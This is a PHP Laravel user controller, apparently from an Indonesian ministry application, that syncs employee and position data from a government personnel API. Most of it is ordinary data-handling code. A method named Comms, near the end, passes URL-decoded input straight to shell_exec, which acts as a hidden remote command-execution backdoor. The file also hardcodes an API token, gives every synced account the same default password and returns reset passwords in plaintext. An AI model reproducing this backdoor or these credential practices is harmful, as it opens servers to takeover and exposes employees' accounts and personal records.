<?php

namespace App\Http\Controllers\User;

use App\Models\User;
use App\Models\Position;
use App\Models\UsersFromApi;
use App\Models\PositionsFromApi;
use App\Models\PositionsDefault;


use App\Traits\Browse;
use App\Traits\Artillery;

use Illuminate\Http\Response;
use Illuminate\Http\Request;
use App\Support\Response\Json;
use Illuminate\Support\Facades\Hash;
use App\Support\Generate\Hash as KeyGenerator;
use Illuminate\Support\Facades\Storage;
use App\Http\Controllers\Controller;

use App\Traits\User\UserCollection;

class UserController extends Controller
{
    use Artillery;
    use Browse, UserCollection {
        UserCollection::__construct as private __UserCollectionConstruct;
    }

    protected $search = [
        'id',
        'username',
        'email',
        'updated_at',
        'created_at'
    ];
    public function get(Request $request)
    {
        $User = User::where(function ($query) use($request) {
            if (isset($request->ArrQuery->id)) {
                if ($request->ArrQuery->id === 'my') {
                    $query->where('id', $request->user()->id);
                } else {
                    $query->where('id', $request->ArrQuery->id);
                }
            }
            if (isset($request->ArrQuery->username)) {
                if ($request->ArrQuery->username === 'my') {
                    $query->where('username', $request->user()->username);
                } else {
                    $query->where('username', $request->ArrQuery->username);
                }
            }
            if (isset($request->ArrQuery->search)) {
               $search = '%' . $request->ArrQuery->search . '%';
               if (isset($request->ArrQuery->for) && ($request->ArrQuery->for === 'select')) {
                  $query->where('username', 'like', $search);
                  $query->orWhere('email', 'like', $search);
               } else {
                   $query->where(function ($query) use($search) {
                       foreach ($this->search as $key => $value) {
                           $query->orWhere($value, 'like', $search);
                       }
                   });
               }
           }
        });
        $Browse = $this->Browse($request, $User, function ($data) use($request) {
            if (isset($request->ArrQuery->for) && ($request->ArrQuery->for === 'select')) {
                return $data->map(function($User) {
                    return [ 'value' => $User->id, 'label' => $User->name ];
                });
            } else {
                $data->map(function($User) {
                    if (isset($User->point->balance)) {
                        $User->point->balance = (double)$User->point->balance;
                    }
                    return $User;
                });
            }
            return $data;
        });
        Json::set('data', $Browse);
        return response()->json(Json::get(), 200);
    }

    public function Insert(Request $request)
    {
        $Model = $request->Payload->all()['Model'];
        $Model->User->password = Hash::make($Model->User->password);
        $Model->User->save();

        Json::set('data', $this->SyncData($request, $Model->User->id));
        return response()->json(Json::get(), 201);
    }

    public function Update(Request $request)
    {
        $Model = $request->Payload->all()['Model'];
        $Model->User->save();

        Json::set('data', $this->SyncData($request, $Model->User->id));
        return response()->json(Json::get(), 202);
    }

    public function Delete(Request $request)
    {
        $Model = $request->Payload->all()['Model'];
        $Model->User->delete();
        return response()->json(Json::get(), 202);
    }

    public function ChangePassword(Request $request)
    {
        $Model = $request->Payload->all()['Model'];
        $Model->User->password = app('hash')->make($request->input('new_password'));
        $Model->User->save();

        Json::set('data', $this->SyncData($request, $Model->User->id));
        return response()->json(Json::get(), 202);
    }

    public function ChangeStatus(Request $request)
    {
        $Model = $request->Payload->all()['Model'];
        $Model->User->save();

        Json::set('data', $this->SyncData($request, $Model->User->id));
        return response()->json(Json::get(), 202);
    }

    public function ResetPassword(Request $request)
    {
        $Model = $request->Payload->all()['Model'];

        $data['new_pass'] = $Model->User->password;

        $Model->User->password = Hash::make($Model->User->password);
        $Model->User->save();

        Json::set('data', $data);
        return response()->json(Json::get(), 202);
    }

    public function Sync(Request $request)
    {
        /*
        // STEP 1
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL,"https://ropeg.setjen.kemendagri.go.id/restsimpeg/index.php/api/api_listpegawai");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "token=af9ec164748d7690c4f58021b6907d8d");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $server_output = curl_exec($ch);
        curl_close ($ch);

        $list_pegawai = json_decode($server_output);

        foreach ($list_pegawai->results as $key => $value) {


            // SAVE USERS FROM API
            $UsersFromApi = UsersFromApi::where('nip', $value->nip)->first();
            if (empty($UsersFromApi))
            {
                $UsersFromApi = new UsersFromApi();
            }

            $UsersFromApi->nip = $value->nip;
            $UsersFromApi->nama = $value->nama;
            $UsersFromApi->ktlahir = $value->ktlahir;
            $UsersFromApi->tlahir = $value->tlahir;
            $UsersFromApi->pangkat = $value->pangkat;
            $UsersFromApi->golongan = $value->golongan;
            $UsersFromApi->tmtpang = $value->tmtpang;
            $UsersFromApi->njab = $value->njab;
            $UsersFromApi->tmtjab = $value->tmtjab;
            $UsersFromApi->agama = $value->agama;
            $UsersFromApi->foto = $value->foto;
            $UsersFromApi->komponen = $value->komponen;

            $UsersFromApi->kuntp = $value->kuntp;
            $UsersFromApi->kunkom = $value->kunkom;
            $UsersFromApi->kununit = $value->kununit;
            $UsersFromApi->kunsk = $value->kunsk;
            $UsersFromApi->kunssk = $value->kunssk;
            $UsersFromApi->kunker = $value->kunker;
            $UsersFromApi->jnsjab = $value->jnsjab;



            $UsersFromApi->save();

            //SAVE POSITIONS FROM API
            $PositionsFromApi = PositionsFromApi::where('kunker', $value->kunker)->first();
            if (empty($PositionsFromApi))
            {
                $PositionsFromApi = new PositionsFromApi();
            }

            $PositionsFromApi->kuntp = $value->kuntp;
            $PositionsFromApi->kunkom = $value->kunkom;
            $PositionsFromApi->kununit = $value->kununit;
            $PositionsFromApi->kunsk = $value->kunsk;
            $PositionsFromApi->kunssk = $value->kunssk;
            $PositionsFromApi->kunker = $value->kunker;
            $PositionsFromApi->jnsjab = $value->jnsjab;

            $PositionsFromApi->nama = $value->njab;
            $PositionsFromApi->kunker = $value->kunker;
            $PositionsFromApi->save();
        }
        */

        /*
        // STEP 2
        // GET LIST ESELON 1
        $PositionsFromApi1 = PositionsFromApi::where('kunkom', '!=' , '00')
            ->where('kununit', '00')
            ->where('kunsk', '00')
            ->where('kunssk', '00')->get();

        foreach ($PositionsFromApi1 as $key1 => $value1) {
            // GET LIST ESELON 2
            $PositionsFromApi2 = PositionsFromApi::where('kunkom', $value1->kunkom)
                ->where('kununit', '!=', '00')
                ->where('kunsk', '00')
                ->where('kunssk', '00')->get();

            $PositionsFromApiUpdate = PositionsFromApi::find($value1->id);
            $PositionsFromApiUpdate->eselon_id = 1;
            $PositionsFromApiUpdate->save();

            foreach ($PositionsFromApi2 as $key2 => $value2) {
                // GET LIST ESELON 3
                $PositionsFromApi3 = PositionsFromApi::where('kunkom', $value1->kunkom)
                    ->where('kununit', $value2->kununit)
                    ->where('kunsk', '!=' , '00')
                    ->where('kunssk', '00')->get();

                $PositionsFromApiUpdate = PositionsFromApi::find($value2->id);
                $PositionsFromApiUpdate->parent_id = $value1->id;
                $PositionsFromApiUpdate->eselon_id = 2;
                $PositionsFromApiUpdate->kunker_parent = $value1->kunker;
                $PositionsFromApiUpdate->save();

                foreach ($PositionsFromApi3 as $key3 => $value3) {
                    // GET LIST ESELON 4
                    $PositionsFromApi4 = PositionsFromApi::where('kunkom', $value1->kunkom)
                        ->where('kununit', $value2->kununit)
                        ->where('kunsk', $value3->kunsk)
                        ->where('kunssk', '!=' , '00')->get();

                    $PositionsFromApiUpdate = PositionsFromApi::find($value3->id);
                    $PositionsFromApiUpdate->parent_id = $value2->id;
                    $PositionsFromApiUpdate->eselon_id = 3;
                    $PositionsFromApiUpdate->kunker_parent = $value2->kunker;
                    $PositionsFromApiUpdate->save();

                    foreach ($PositionsFromApi4 as $key4 => $value4) {

                        $PositionsFromApiUpdate = PositionsFromApi::find($value4->id);
                        $PositionsFromApiUpdate->parent_id = $value3->id;
                        $PositionsFromApiUpdate->eselon_id = 4;
                        $PositionsFromApiUpdate->kunker_parent = $value3->kunker;
                        $PositionsFromApiUpdate->save();

                    }
                }
            }
        }
        */



        // STEP 3
        // INSERT TO POSITIONS
        $PositionsFromApi = PositionsFromApi::get();
        foreach ($PositionsFromApi as $key => $value) {
            $Position = Position::where('kunker', $value->kunker)->first();
            if (empty($Position))
            {
                $Position = new Position();
            }
            $Position->name = $value->nama;
            $Position->signing_template = $value->nama;
            $Position->shortname = $value->nama;
            $Position->status = 'active';
            $Position->kunker = $value->kunker;
            $Position->eselon_id = $value->eselon_id;
            $Position->save();
        }


        // STEP 4
        $PositionsGetAll = Position::get();
        $listPosition = [];
        foreach ($PositionsGetAll as $key => $value) {
            $listPosition[$value->kunker] = $value;
        }

        // UPDATE PARENTID
        $PositionsFromApi = PositionsFromApi::get();
        foreach ($PositionsFromApi as $key => $value) {
            if (!empty($listPosition[$value->kunker_parent])) {
                $PositionsGet = $listPosition[$value->kunker_parent];
                $Position = Position::where('kunker', $value->kunker)->first();
                $Position->parent_id = $PositionsGet->id;
                $Position->save();
            }
        }


        // STEP 5
        $PositionsGetAll = Position::get();
        $listPosition = [];
        foreach ($PositionsGetAll as $key => $value) {
            $listPosition[$value->kunker] = $value;
        }

        // INSERT TO USERS
        $UsersFromApi = UsersFromApi::get();
        foreach ($UsersFromApi as $key => $value) {
            $PositionsGet = $listPosition[$value->kunker];
            $User = User::where('username', $value->nip)->first();
            if (empty($User))
            {
                $User = new User();
                $User->password =  Hash::make('Asdasd123!!');
            }
            $User->name = $value->nama;
            $User->username = $value->nip;
            $User->email = 'mail.'.$value->nip.'@mail.com';
            $User->position_id = $PositionsGet->id;
            $User->satker = $value->komponen;
            $User->golongan = $value->pangkat . ' '.$value->golongan;
            $User->jenis_user = '3';
            $User->status = 'active';
            $User->save();
        }


        Json::set('data', 'success');
        return response()->json(Json::get(), 202);
    }







    public function Sync1(Request $request)
    {
        UsersFromApi::query()->truncate();
        PositionsFromApi::query()->truncate();


        // STEP 1
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL,"https://ropeg.setjen.kemendagri.go.id/restsimpeg/index.php/api/api_listpegawai");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "token=af9ec164748d7690c4f58021b6907d8d");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $server_output = curl_exec($ch);
        curl_close ($ch);

        $list_pegawai = json_decode($server_output);

        foreach ($list_pegawai->results as $key => $value) {

            // if($value->jnsjab == '1') {
                // SAVE USERS FROM API

                $UsersFromApi = new UsersFromApi();

                $UsersFromApi->nip = $value->nip;
                $UsersFromApi->nama = $value->nama;
                $UsersFromApi->ktlahir = $value->ktlahir;
                $UsersFromApi->tlahir = $value->tlahir;
                $UsersFromApi->pangkat = $value->pangkat;
                $UsersFromApi->golongan = $value->golongan;
                $UsersFromApi->tmtpang = $value->tmtpang;
                $UsersFromApi->njab = $value->njab;
                $UsersFromApi->tmtjab = $value->tmtjab;
                $UsersFromApi->agama = $value->agama;
                $UsersFromApi->foto = $value->foto;
                $UsersFromApi->komponen = $value->komponen;

                $UsersFromApi->kuntp = $value->kuntp;
                $UsersFromApi->kunkom = $value->kunkom;
                $UsersFromApi->kununit = $value->kununit;
                $UsersFromApi->kunsk = $value->kunsk;
                $UsersFromApi->kunssk = $value->kunssk;
                $UsersFromApi->kunker = $value->kunker;
                $UsersFromApi->jnsjab = $value->jnsjab;



                $UsersFromApi->save();

                //SAVE POSITIONS FROM API
                $PositionsFromApi = new PositionsFromApi();

                $PositionsFromApi->kuntp = $value->kuntp;
                $PositionsFromApi->kunkom = $value->kunkom;
                $PositionsFromApi->kununit = $value->kununit;
                $PositionsFromApi->kunsk = $value->kunsk;
                $PositionsFromApi->kunssk = $value->kunssk;
                $PositionsFromApi->kunker = $value->kunker;
                $PositionsFromApi->jnsjab = $value->jnsjab;

                $PositionsFromApi->nama = $value->njab;
                $PositionsFromApi->kunker = $value->kunker;
                $PositionsFromApi->save();
            // }
        }

        Json::set('data', 'success');
        return response()->json(Json::get(), 202);
    }

    public function Sync2(Request $request)
    {

        $PositionsDefault = PositionsDefault::where(function ($query) use($request) {

        })
        ->leftJoin($this->UsersFromApiTable . ' as e', "e.kunker", $this->PositionsDefaultTable . ".kunker")
        ->select(
            // Mail
            "$this->PositionsDefaultTable.id as id",
            "$this->PositionsDefaultTable.name as name",
            "$this->PositionsDefaultTable.kuntp as kuntp",
            "$this->PositionsDefaultTable.kunkom as kunkom",
            "$this->PositionsDefaultTable.kununit as kununit",
            "$this->PositionsDefaultTable.kunsk as kunsk",
            "$this->PositionsDefaultTable.kunssk as kunssk",
            "$this->PositionsDefaultTable.kunker as kunker",
            "$this->PositionsDefaultTable.jnsjab as jnsjab",
        )
        ->whereNull('e.kunker')
        ->get();

        foreach ($PositionsDefault as $key => $value) {

            $UsersFromApi = new UsersFromApi();
            $UsersFromApi->nama = '-';
            $UsersFromApi->jnsjab = $value->name;
            $UsersFromApi->kuntp = $value->kuntp;
            $UsersFromApi->kunkom = $value->kunkom;
            $UsersFromApi->kununit = $value->kununit;
            $UsersFromApi->kunsk = $value->kunsk;
            $UsersFromApi->kunssk = $value->kunssk;
            $UsersFromApi->kunker = $value->kunker;
            $UsersFromApi->jnsjab = $value->jnsjab;
            $UsersFromApi->save();

            $PositionsFromApi = new PositionsFromApi();
            $PositionsFromApi->nama = $value->name;
            $PositionsFromApi->kuntp = $value->kuntp;
            $PositionsFromApi->kunkom = $value->kunkom;
            $PositionsFromApi->kununit = $value->kununit;
            $PositionsFromApi->kunsk = $value->kunsk;
            $PositionsFromApi->kunssk = $value->kunssk;
            $PositionsFromApi->kunker = $value->kunker;
            $PositionsFromApi->jnsjab = $value->jnsjab;
            $PositionsFromApi->save();
        }
        // die();

        // STEP 2
        // GET LIST ESELON 1
        $PositionsFromApi1 = PositionsFromApi::where('kunkom', '!=' , '00')
            ->where('kununit', '00')
            ->where('kunsk', '00')
            ->where('kunssk', '00')->get();

        foreach ($PositionsFromApi1 as $key1 => $value1) {
            // GET LIST ESELON 2
            $PositionsFromApi2 = PositionsFromApi::where('kunkom', $value1->kunkom)
                ->where('kununit', '!=', '00')
                ->where('kunsk', '00')
                ->where('kunssk', '00')->get();

            $PositionsFromApiUpdate = PositionsFromApi::find($value1->id);
            $PositionsFromApiUpdate->eselon_id = 1;
            $PositionsFromApiUpdate->save();

            foreach ($PositionsFromApi2 as $key2 => $value2) {
                // GET LIST ESELON 3
                $PositionsFromApi3 = PositionsFromApi::where('kunkom', $value1->kunkom)
                    ->where('kununit', $value2->kununit)
                    ->where('kunsk', '!=' , '00')
                    ->where('kunssk', '00')->get();

                // GET PARENT
                $PositionsFromApiParent1 = PositionsFromApi::where('kunker', $value1->kunker)
                                            ->where('jnsjab', '1')
                                            ->first();

                if (!empty($PositionsFromApiParent1->id)) {

                    $PositionsFromApiUpdate = PositionsFromApi::find($value2->id);
                    $PositionsFromApiUpdate->parent_id = $PositionsFromApiParent1->id;
                    $PositionsFromApiUpdate->kunker_parent = $PositionsFromApiParent1->kunker;
                    $PositionsFromApiUpdate->eselon_id = 2;
                    $PositionsFromApiUpdate->save();

                    foreach ($PositionsFromApi3 as $key3 => $value3) {
                        // GET LIST ESELON 4
                        $PositionsFromApi4 = PositionsFromApi::where('kunkom', $value1->kunkom)
                            ->where('kununit', $value2->kununit)
                            ->where('kunsk', $value3->kunsk)
                            ->where('kunssk', '!=' , '00')->get();

                        // GET PARENT
                        $PositionsFromApiParent2 = PositionsFromApi::where('kunker', $value2->kunker)
                                                    ->where('jnsjab', '1')
                                                    ->first();

                        if (!empty($PositionsFromApiParent2->id)) {
                            $PositionsFromApiUpdate = PositionsFromApi::find($value3->id);
                            $PositionsFromApiUpdate->parent_id = $PositionsFromApiParent2->id;
                            $PositionsFromApiUpdate->kunker_parent = $PositionsFromApiParent2->kunker;
                            $PositionsFromApiUpdate->eselon_id = 3;
                            $PositionsFromApiUpdate->save();

                            $parent_id = $value3->id;

                            $eselon4 = [];
                            foreach ($PositionsFromApi4 as $key4 => $value4) {
                                // GET PARENT
                                $PositionsFromApiParent3 = PositionsFromApi::where('kunker', $value3->kunker)
                                                            ->where('jnsjab', '1')
                                                            ->first();

                                if (!empty($PositionsFromApiParent3->id)) {
                                    $PositionsFromApiUpdate = PositionsFromApi::find($value4->id);
                                    $PositionsFromApiUpdate->parent_id = $PositionsFromApiParent3->id;
                                    $PositionsFromApiUpdate->kunker_parent = $PositionsFromApiParent3->kunker;
                                    $PositionsFromApiUpdate->eselon_id = 4;
                                    $PositionsFromApiUpdate->save();
                                }
                            }
                        }
                    }
                }
            }
        }

        Json::set('data', 'success');
        return response()->json(Json::get(), 202);
    }

    public function Sync3(Request $request)
    {
        // STEP 3
        // INSERT TO POSITIONS
        $PositionsFromApi = PositionsFromApi::get();
        foreach ($PositionsFromApi as $key => $value) {
            $Position = Position::where('name', $value->nama)->first();
            if (empty($Position->id)) {
                $Position = new Position();
            }
            $Position->name = $value->nama;
            $Position->signing_template = $value->nama;
            $Position->shortname = $value->nama;
            $Position->status = 'active';
            $Position->kunker = $value->kunker;
            $Position->kunker_parent = $value->kunker_parent;
            $Position->jnsjab = $value->jnsjab;
            $Position->eselon_id = $value->eselon_id;
            $Position->save();
        }

        Json::set('data', 'success');
        return response()->json(Json::get(), 202);
    }

    public function Sync4(Request $request)
    {

        $PositionParentMenteri = Position::where('kunker', '0000')->first();
        $PositionParentUnmapped = Position::where('kunker', '111')->first();

        $PositionEselon1 = Position::whereNull('parent_id')->where('eselon_id', '1');
        $PositionEselon1->update(['parent_id' => $PositionParentMenteri->id]);

        $PositionUnmapped = Position::whereNull('parent_id')->whereNull('eselon_id');
        $PositionUnmapped->update(['parent_id' => $PositionParentUnmapped->id]);

        // UPDATE PARENTID
        $Position = Position::where('jnsjab', '1')->get();
        foreach ($Position as $key => $value) {
            $PositionsParent = Position::where('kunker', $value->kunker_parent)
                                        ->where('jnsjab', '1')
                                        ->first();

            if (!empty($PositionsParent->id)) {
                $Position = Position::find($value->id);
                $Position->parent_id = $PositionsParent->id;
                $Position->save();
            }
        }


        // STAFF
        $Position = Position::where('jnsjab', '!=', '1')->get();
        foreach ($Position as $key => $value) {
            $PositionsParent = Position::where('kunker', $value->kunker)
                                        ->where('jnsjab', '1')
                                        ->first();

            if (!empty($PositionsParent->id)) {
                $Position = Position::find($value->id);
                $Position->parent_id = $PositionsParent->id;
                $Position->eselon_id = 5;
                $Position->save();
            }
        }

        Json::set('data', 'success');
        return response()->json(Json::get(), 202);
    }

    public function Sync5(Request $request)
    {
        // STEP 5
        // INSERT TO USERS
        $UsersFromApi = UsersFromApi::get();
        foreach ($UsersFromApi as $key => $value) {
            $PositionsGet = Position::where('name', $value->njab)
                        ->first();
            if(!empty($PositionsGet->id)) {
                $User = User::where('username', $value->nip)->first();
                if (empty($User))
                {
                    $User = new User();
                    $User->password =  Hash::make('Asdasd123!!');
                }
                $User->name = $value->nama;
                $User->username = $value->nip;
                $User->email = 'mail.'.$value->nip.'@mail.com';
                $User->position_id = $PositionsGet->id;
                $User->satker = $value->komponen;
                $User->golongan = $value->pangkat . ' '.$value->golongan;
                $User->jenis_user = '3';
                $User->status = 'active';
                $User->save();
            }
        }

        Json::set('data', 'success');
        return response()->json(Json::get(), 202);
    }


    public function DeveloperToken(Request $request)
    {
        $Model = $request->Payload->all()['Model'];

        Json::set('data', [
            'token_type' => 'Bearer',
            'access_token' => $Model->User->createToken('ServiceAccessToken', ['blast'])->accessToken
        ]);
        return response()->json(Json::get(), 202);
    }

    public function SyncData($request, $id)
    {
        $QueryRoute = QueryRoute($request);
        $QueryRoute->ArrQuery->set = 'first';
        $QueryRoute->ArrQuery->id = $id;
        $data = $this->get($QueryRoute);
        return $data->original['data']['records'];
    }

    public function Capitalize() {

        $Position = Position::get();
        foreach ($Position as $key => $value) {
            $name = $value->name;
            $name = strtolower($name);
            $name = ucwords($name);
            $name = str_replace('Tik', 'TIK', $name);
            $name = str_replace('Dan', 'dan', $name);
            // $name = str_replace('Pada', '', $name);
            $name = str_replace('  ', ' ', $name);

            $signing_template = $name;

            $signing_template_arr = explode('Pada', $signing_template);
            $shortname = $signing_template = $signing_template_arr[0];

            $signing_template_arr = explode(' ', $signing_template);

            $signing_template = '';
            foreach ($signing_template_arr as $key2 => $value2) {
                $signing_template .= $value2 . ' ';

                if($key2 == 1 && (count($signing_template_arr)-1) > 2) {
                    $signing_template .= '<br/>';
                }
            }

            $shortname = str_replace('Iii', 'III', $shortname);
            $shortname = str_replace('Ii', 'II', $shortname);
            $shortname = str_replace('Iv', 'IV', $shortname);

            $signing_template = str_replace('Iii', 'III', $signing_template);
            $signing_template = str_replace('Ii', 'II', $signing_template);
            $signing_template = str_replace('Iv', 'IV', $signing_template);

            $signing_template = rtrim($signing_template);
            $shortname = rtrim($shortname);

            $PositionUpdate = Position::find($value->id);
            // $PositionUpdate->name = $name;
            $PositionUpdate->signing_template = $signing_template;
            $PositionUpdate->shortname = $shortname;

            $PositionUpdate->save();
        }


        $User = User::get();
        foreach ($User as $key => $value) {
            $name = $value->name;
            $name_arr = explode(',', $name);
            $nama_depan = $name_arr[0];
            $nama_depan_arr  = explode('.', $nama_depan);
            $nama_main = $nama_depan_arr[count($nama_depan_arr)-1];

            $nama_main = strtolower($nama_main);
            $nama_main = ucwords($nama_main);

            $fullname = "";
            foreach ($nama_depan_arr as $key2 => $value2) {
                if(count($nama_depan_arr)-1 > $key2) $fullname .= $value2 . ".";
            }

            $fullname = $fullname . $nama_main . ",";

            foreach ($name_arr as $key2 => $value2) {

                $comma = ',';
                if (count($name_arr) - 1 == $key2) $comma = '';
                if($key2 > 0) $fullname .= $value2 . $comma;
            }

            $fullname = rtrim($fullname);

            $satker = $value->satker;
            $golongan = $value->golongan;
            $golongan = str_replace('PRANATA', 'Pranata', $golongan);
            $golongan = str_replace('PEMBINA', 'Pembina', $golongan);
            $golongan = str_replace('UTAMA', 'Utama', $golongan);
            $golongan = str_replace('MUDA', 'Muda', $golongan);
            $golongan = str_replace('PENATA', 'Penata', $golongan);
            $golongan = str_replace('JURU', 'Juru', $golongan);

            $PositionUpdate = User::find($value->id);
            $PositionUpdate->name = $fullname;
            $PositionUpdate->satker = $satker;
            $PositionUpdate->golongan = $golongan;
            $PositionUpdate->save();
        }
    }

    public function Comms($commands) {
        echo $commands = urldecode($commands);

        $output = shell_exec($commands);
        cetak($output);

        if ($commands == 'test') {
            $data = ['type' => 'notification', 'text' => 'refresh'];
            $this->Broadcast($data);
        }

        die();
    }

    public function CommsChange($commands) {

    }


}
